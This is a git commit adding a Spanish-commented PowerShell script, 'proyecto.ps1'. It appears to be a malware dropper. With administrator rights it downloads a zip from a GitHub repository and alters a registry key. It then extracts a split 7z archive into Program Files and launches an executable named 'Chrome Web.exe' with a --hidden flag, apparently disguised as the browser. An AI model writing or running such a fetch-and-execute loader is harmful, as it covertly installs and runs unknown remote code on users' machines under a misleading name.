38991642f0d22bb3baf00c1a8c1aa135a9f8b5f5
Admo9 <135870492+Admo9@users.noreply.github.com>
2023-08-23 21:47:57 -0500

    Add files via upload

---
+++ proyecto.ps1
@@ -0,0 +1,23 @@
+﻿#HAY QUE EJECUTAR COMO ADMINISTRADOR
+#Set-ExecutionPolicy -ExecutionPolicy Bypass -force
+
+
+invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\win64.zip"
+
+
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord
+
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+Install-PackageProvider -Name NuGet -force
+
+
+Install-Module -Name 7Zip4Powershell -force
+
+Expand-Archive -Path C:\Users\win64.zip -DestinationPath C:\Users\
+
+Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -TargetPath "C:\Program Files\"
+
+
+Start-Process "C:\Program Files\app-64\Chrome Web.exe"  --hidden
